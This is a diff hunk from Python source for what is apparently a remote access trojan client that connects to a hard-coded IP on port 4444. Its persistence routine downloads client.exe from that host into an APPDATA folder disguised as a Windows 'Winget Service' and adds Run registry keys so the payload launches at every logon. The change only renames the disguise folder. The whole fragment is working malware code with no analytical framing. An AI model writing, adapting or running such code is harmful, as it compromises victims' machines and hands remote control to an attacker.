@@ -644,22 +644,22 @@ rat = RAT_CLIENT('50.116.8.102', 4444)
 
 def persist():
     running_dir = os.getcwd()
-    if running_dir == f"{os.environ['APPDATA']}/Winget Management Service":
+    if running_dir == f"{os.environ['APPDATA']}/Winget Service":
         print('Persistence achieved...')
         return True
     else:
         os.chdir(os.environ['APPDATA'])
         try:
-            os.mkdir('Winget Management Service')
-            os.chdir('Winget Management Service')
+            os.mkdir('Winget Service')
+            os.chdir('Winget Service')
             response = requests.get('http://50.116.8.102/client.exe')
             open('client.exe', 'wb').write(response.content)
-            command = f'REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}\\Winget Management Service\\client.exe"'
+            command = f'REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}\\Winget Service\\client.exe"'
             os.system(command)
-            os.system(f'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}\\Winget Management Service\\client.exe"')
+            os.system(f'REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ManagerAsset /t REG_SZ /d "{os.environ["APPDATA"]}\\Winget Service\\client.exe"')
 
         except FileExistsError:
-            os.chdir('Winget Management Service')
+            os.chdir('Winget Service')
             persistent = os.path.exists('client.exe')
             if not persistent:
                 response = requests.get('http://50.116.8.102/client.exe')
